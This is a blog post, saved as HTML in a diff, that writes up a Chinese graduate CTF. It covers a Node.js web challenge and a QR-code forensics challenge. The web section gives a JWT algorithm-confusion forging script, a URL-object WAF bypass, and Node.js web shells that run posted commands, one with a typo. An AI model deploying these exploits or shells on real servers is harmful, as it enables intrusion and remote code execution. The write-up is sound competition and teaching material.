@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>“华为杯”第一届中国研究生网络安全创新大赛web | Artone &#39;s Blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://boooook123.github.io/Artone.github.io//favicon.ico?v=1668409090686">
+<link rel="stylesheet" href="https://boooook123.github.io/Artone.github.io//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="研究生赛，作为本科生就是过来凑个数。。。
+
+HackThisBox
+提供了整个docker源码，
+在app中设置了api路径
+app.use('/', indexRouter);
+app.use('/api', apiRouter);
+
+
+..." />
+    <meta name="keywords" content="IDAT,zlib,IEND,hex,nodemon,JWT伪造,writeFileSync,url对象,文件覆盖,js一句话木马,RCE,MISC,WEB" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://boooook123.github.io/Artone.github.io/">
+        <img src="https://boooook123.github.io/Artone.github.io//images/avatar.png?v=1668409090686" class="site-logo">
+        <h1 class="site-title">Artone &#39;s Blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      一些细细的琐事。。
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://boooook123.github.io/Artone.github.io//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">“华为杯”第一届中国研究生网络安全创新大赛web</h2>
+            <div class="post-date">2022-11-14</div>
+            
+            <div class="post-content" v-pre>
+              <p>研究生赛，作为本科生就是过来凑个数。。。</p>
+<!-- more -->
+<h1 id="hackthisbox">HackThisBox</h1>
+<p>提供了整个docker源码，</p>
+<p>在app中设置了api路径</p>
+<pre><code>app.use('/', indexRouter);
+app.use('/api', apiRouter);
+
+</code></pre>
+<p>api下有两个路由，一个是login</p>
+<pre><code class="language-javascript">router.post('/login', function(req, res, next) { //login路由   可控传参username
+  const token = jwt.sign({ username: req.body.username, isAdmin: false, home: req.body.username }, privateKey, { algorithm: &quot;RS256&quot; });
+  res.send({
+    status:200,
+    msg:&quot;success&quot;,
+    token
+  })
+})
+</code></pre>
+<p>有一个jwt认证，采用的是RS256的非对称加密</p>
+<p>再看upload路由</p>
+<pre><code class="language-javascript">router.post('/upload', function(req, res, next) {
+  if(req.files.length !== 0) {
+    var savePath = '';
+    if(req.auth.isAdmin === false) {
+      var dirName = `./public/upload/${req.auth.home}/`  //admin
+      fs.mkdir(dirName, (err)=&gt;{   //新建一个目录
+        if(err) {
+          console.log('error')
+        } else {
+          console.log('ok')
+        }
+      });
+      savePath = path.join(dirName, req.files[0].originalname);  //路径拼接后缀名 
+    } else if(req.auth.isAdmin === true) {
+      savePath = req.auth.home;  //可控路径  ./views/index.twig
+    }
+
+      fs.readFile(req.files[0].path, function(err, data) {   //
+        if(err) {
+          return res.status(500).send(&quot;error&quot;);
+        } else {
+          fs.writeFileSync(savePath, data);
+        }
+      });
+    return res.status(200).send(&quot;file upload successfully&quot;);
+  } else {
+    return res.status(500).send(&quot;error&quot;);
+  }
+});
+</code></pre>
+<p>通过Authorization请求头获取</p>
+<h2 id="jwt绕过">jwt绕过</h2>
+<p>https://www.freebuf.com/column/170359.html<br>
+这里我们利用CVE-2016-5431 - 密钥混淆攻击<br>
+此攻击的原因是某些库对签名/验证HMAC对称加密的密钥和包含用于验证RSA签名令牌的公钥的密钥使用相同的变量名。<br>
+通过将算法调整为HMAC变体（HS256/HS384/HS512）并使用公共可用公钥对其进行签名，我们可以欺骗服务使用机密变量中的硬编码公钥验证HMAC令牌。<br>
+简而言之就是将非对称密码变成了对称密码</p>
+<pre><code class="language-javascript">
+app.use(expressjwt({ secret: publicKey, algorithms: [&quot;HS256&quot;, &quot;RS256&quot;]}).unless({ path: [&quot;/&quot;, &quot;/api/login&quot;] }))
+
+</code></pre>
+<p>这里它同时支持了HS256以及RS256算法，并且都使用publicKey作为公钥，如果现在我们伪造JWT，使得head为</p>
+<pre><code>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;} 
+</code></pre>
+<p>那么服务器就会顺其自然的将它作为HS256去解码，由于HS256是对称加密，所以只要有公钥就可以实现伪造<br>
+伪造admin后，我们可以实现任意文件写，由于这里还安装了nodemon这个拓展，也就是说，只要文件发生<br>
+更改，整个项目就会自动重载，于是<br>
+考虑文件覆盖index.js来实现RCE</p>
+<p>但是在app.js设置了一个通防waf</p>
+<p>但是还是有绕过的可能，因为任意文件写调用的是writeFileSync()，这个函数和readFileSync()可以说是本是同根生，</p>
+<p>也就是说它也可以通过传入url对象，是指对其进行url解码，从而绕过waf</p>
+<p>生成一个url对象</p>
+<pre><code class="language-javascript">const fs = require('fs');
+data = &quot;123&quot;;
+fs.writeFileSync(new URL('file:///E:/test.txt'),data);
+console.log(new URL('file:///./rout%65s/index.%6as'));
+</code></pre>
+<p>输出</p>
+<pre><code>URL {
+  href: 'file:///rout%65s/index.%6as',
+  origin: 'null',
+  protocol: 'file:',
+  username: '',
+  password: '',
+  host: '',
+  hostname: '',
+  port: '',
+  pathname: '/rout%65s/index.%6as',
+  search: '',
+  searchParams: URLSearchParams {},
+  hash: ''
+}
+</code></pre>
+<p>手动转化为json，放在home字段</p>
+<p>exp</p>
+<pre><code class="language-python">import jwt
+
+public = open('public.pem', 'r').read()
+header = {
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;alg&quot;: &quot;HS256&quot;
+}
+payload = {
+  &quot;username&quot;: &quot;./index.php&quot;,
+  &quot;isAdmin&quot;: True,
+    &quot;home&quot;:{&quot;href&quot;: 'file://./rout%65s/ind%65x.%6as',&quot;origin&quot;: 'null',&quot;protocol&quot;: 'file:',&quot;username&quot;: '',&quot;password&quot;: '',&quot;host&quot;: '',&quot;hostname&quot;: '',&quot;port&quot;: '',&quot;pathname&quot;: './rout%65s/ind%65x.%6as',&quot;search&quot;: '',&quot;searchParams&quot;: &quot;URLSearchParams {}&quot;,&quot;hash&quot;: ''},
+   &quot;iat&quot;: 1668309016
+}
+encoded = jwt.encode(payload, public, algorithm='HS256', headers=header)
+
+print(encoded)
+</code></pre>
+<p>然后再写一个index.js，传进去覆盖原来的index.js，利用模板读取flag</p>
+<pre><code class="language-javascript">var express = require('express');
+var router = express.Router();
+
+/* GET home page. */
+router.get('/', function(req, res, next) {
+  res.render('index', { title: require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() }); 
+});
+
+module.exports = router;
+</code></pre>
+<p>或者直接覆盖掉index.js然后写个shell</p>
+<pre><code class="language-javascript">var express = require('express');
+var router = express.Router();
+
+var exec = require('child_process').exec;
+/* GET home page. */
+router.post('/', function(req, res, next) {
+    exec(req.body.cmd, function(error, stdout, stderr) {
+        if(error){
+            console.error(error);
+        }
+        else{
+            console.log(&quot;success&quot;);
+        }
+        return res.send(stdout);
+    });
+
+});
+
+module.exports = router;
+</code></pre>
+<p>一句话版</p>
+<pre><code class="language-javascript">var express = require('express');
+var router = express.Router();
+
+/* GET home page. */
+router.post('/', function(req, res, next) {
+    return res,send(require(&quot;child_process&quot;).exec(req.body.cmd).toString());
+
+});
+
+module.exports = router;
+</code></pre>
+<p>post给cmd传参</p>
+<pre><code>
+</code></pre>
+<h1 id="misc_bit_qr">misc_Bit_QR</h1>
+<p>一个缺少了定位符的二维码，补全定位码直接解，<br>
+<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408973417.png" alt="" loading="lazy"></p>
+<p>得到457c</p>
+<p>用010打开图片，发现IEND后面还有内容，应该是一个缺了部分文件头的png图片，手动提取一下<br>
+<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408997207.png" alt="" loading="lazy"></p>
+<p>得到一张新的二维码，扫码得到半个flag</p>
+<p>在原来的那张二维码中还发现有一个很小的idat块，zlib解压出来发现是一串16进制数据</p>
+<p>42064652d3431356135323533646230387d0ec187c229c4d4a44</p>
+<p>直接解码得到一串乱码，仔细观察发现06这个字节有问题，如果删去0，貌似可以得到一串字符串<br>
+<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408986799.png" alt="" loading="lazy"></p>
+<p>又提示了flag中没有大写字母，所以把第一个字母也去掉</p>
+<p>全部拼接起来得到最后的flag</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/EfLMGtLL8/" class="tag">
+                    IDAT
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/KmCiqR6umo/" class="tag">
+                    zlib
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/nwm_fRIC0d/" class="tag">
+                    IEND
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/D585bXUMti/" class="tag">
+                    hex
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/pqTd9UOVG/" class="tag">
+                    nodemon
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/6Sfs43MmQ/" class="tag">
+                    JWT伪造
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/hJ8Dab_FnJ/" class="tag">
+                    writeFileSync
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/5b72szdmKS/" class="tag">
+                    url对象
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/LmARjO96CB/" class="tag">
+                    文件覆盖
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/p-ID0uZquL/" class="tag">
+                    js一句话木马
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/w1u4sc9nry/" class="tag">
+                    RCE
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/_7s7Vrkzq/" class="tag">
+                    MISC
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/3cJUATMNRB/" class="tag">
+                    WEB
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://boooook123.github.io/Artone.github.io/post/gfctf-wp/">
+                  <h3 class="post-title">
+                    GFCTF wp
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
